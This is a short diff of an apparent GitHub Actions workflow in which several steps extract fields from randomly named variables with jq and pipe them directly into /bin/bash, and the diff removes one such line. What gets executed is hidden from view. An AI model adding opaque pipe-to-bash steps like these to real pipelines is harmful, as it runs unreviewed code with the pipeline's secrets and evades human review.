@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$xpfqb931" | jq -r .b8 | /bin/bash
           echo $f18 | jq -r .cu6 | /bin/bash
           printf '%s' "$rt14" | jq -r .rs7260 | /bin/bash
-          echo $mnrav758 | jq -r .q8704 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
